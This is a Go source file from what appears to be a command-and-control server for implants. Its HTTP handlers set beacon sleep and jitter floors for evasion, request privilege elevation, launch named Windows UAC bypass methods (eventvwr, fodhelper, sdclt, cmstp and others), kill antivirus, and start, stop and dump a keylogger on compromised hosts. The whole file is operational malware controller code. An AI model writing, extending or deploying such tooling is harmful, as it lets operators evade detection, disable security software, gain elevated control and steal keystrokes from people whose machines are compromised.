package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

// ── Sleep / elevate / UAC / AV / keylogger / creds ─────────────────────────

func (s *Server) handleSetSleep(c *gin.Context) {
	id := c.Param("id")

	// Floor the accepted range by the configured OPSEC minimums
	// (implant.min_interval/min_jitter); the JSON/form values below are
	// additionally clamped, never rejected, so older consoles keep working.
	s.configMu.RLock()
	minInterval, minJitter := s.cfg.Implant.MinInterval, s.cfg.Implant.MinJitter
	s.configMu.RUnlock()
	if minInterval < 1 {
		minInterval = 1
	}
	if minJitter < 0 {
		minJitter = 0
	}
	var sleep string
	if strings.Contains(c.ContentType(), "application/json") {
		var req struct {
			Interval int `json:"interval"`
			Jitter   int `json:"jitter"`
		}
		if err := c.ShouldBindJSON(&req); err == nil {
			if req.Interval < 1 || req.Interval > 86400 || req.Jitter < 0 || req.Jitter > 100 {
				respondError(c, http.StatusBadRequest, "invalid sleep range: interval 1-86400 seconds, jitter 0-100 percent")
				return
			}
			if req.Interval < minInterval {
				req.Interval = minInterval
			}
			if req.Jitter < minJitter {
				req.Jitter = minJitter
			}
			sleep = fmt.Sprintf("%d,%d", req.Interval, req.Jitter)
		}
	}
	if sleep == "" {
		sleep = c.PostForm("sleep")
	}
	if sleep == "" {
		sleep = c.PostForm("command")
	}
	sleep = clampSleepString(sleep, minInterval, minJitter)
	task := s.issueAgentTask(c, id, TaskSpec{Type: "set_sleep", Command: sleep})
	if task == nil {
		return
	}
	slog.Info("Set sleep requested", "agent_id", id, "sleep", sleep)
	s.dispatchTask(c, task, "set_sleep", sleep)
}

// clampSleepString enforces the configured OPSEC minimums on a
// "interval,jitter" sleep string. Unparseable input passes through untouched
// so downstream validation still reports the original error.
func clampSleepString(sleep string, minInterval, minJitter int) string {
	parts := strings.Split(sleep, ",")
	if len(parts) != 2 {
		return sleep
	}
	interval, err1 := strconv.Atoi(strings.TrimSpace(parts[0]))
	jitter, err2 := strconv.Atoi(strings.TrimSpace(parts[1]))
	if err1 != nil || err2 != nil {
		return sleep
	}
	if interval < minInterval {
		interval = minInterval
	}
	if jitter < minJitter {
		jitter = minJitter
	}
	return fmt.Sprintf("%d,%d", interval, jitter)
}

// sleepMinimums returns the configured OPSEC floors for beacon timing
// (implant.min_interval/min_jitter), sanitized. Every set_sleep entry point
// funnels through these so no path can dial beaconing below the floors.
func (s *Server) sleepMinimums() (minInterval, minJitter int) {
	minInterval, minJitter = 1, 0
	if s == nil || s.cfg == nil {
		return minInterval, minJitter
	}
	s.configMu.RLock()
	minInterval, minJitter = s.cfg.Implant.MinInterval, s.cfg.Implant.MinJitter
	s.configMu.RUnlock()
	if minInterval < 1 {
		minInterval = 1
	}
	if minJitter < 0 {
		minJitter = 0
	}
	return minInterval, minJitter
}

// clampSleepInts enforces the OPSEC floors on a parsed interval/jitter pair,
// reporting whether clamping altered either value (callers audit overrides).
func (s *Server) clampSleepInts(interval, jitter int) (int, int, bool) {
	minInterval, minJitter := s.sleepMinimums()
	outInterval, outJitter, changed := interval, jitter, false
	if outInterval < minInterval {
		outInterval, changed = minInterval, true
	}
	if outJitter < minJitter {
		outJitter, changed = minJitter, true
	}
	return outInterval, outJitter, changed
}

func (s *Server) handleElevate(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	cmd := c.PostForm("cmd")
	if cmd == "" {
		cmd = c.PostForm("command")
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "elevate", Command: cmd})
	if task == nil {
		return
	}
	slog.Info("Elevate requested", "agent_id", id, "cmd", cmd)
	s.dispatchTask(c, task, "elevate", cmd)
}

func (s *Server) handleUACBypass(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	method := c.PostForm("method")
	if method == "" {
		respondError(c, http.StatusBadRequest, "method is required (eventvwr, fodhelper, computerdefaults, sdclt, cmstp)")
		return
	}
	payload := c.PostForm("payload")
	// The wire format is method|payload and the implant splits on '|': an
	// unvalidated '|' in either field shifts the payload, so the bypass would run
	// a different command than the operator chose. Same guard the inject/spawn
	// paths already use.
	if err := validateCommandArg(method, MaxTechniqueLength, "method"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	if err := validateCommandArg(payload, MaxTargetLength, "payload"); err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	cmd := method + "|" + payload
	task := s.issueAgentTask(c, id, TaskSpec{Type: "uac_bypass", Command: cmd})
	if task == nil {
		return
	}
	slog.Info("UAC bypass requested", "agent_id", id, "method", method)
	s.LogAuditRecord(c, "uac_bypass", "agent", id, "UAC bypass: "+method, true, nil)
	s.dispatchTask(c, task, "uac_bypass", method)
}

func (s *Server) handleKillAV(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kill_av", "kill_av", ""})
}

// Keylogger handlers (high-value addition)
func (s *Server) handleStartKeylogger(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_start", "keylogger_start", "start"})
}

func (s *Server) handleStopKeylogger(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_stop", "keylogger_stop", "stop"})
}

func (s *Server) handleDumpKeylogger(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_dump", "keylogger_dump", "dump logs"})
}
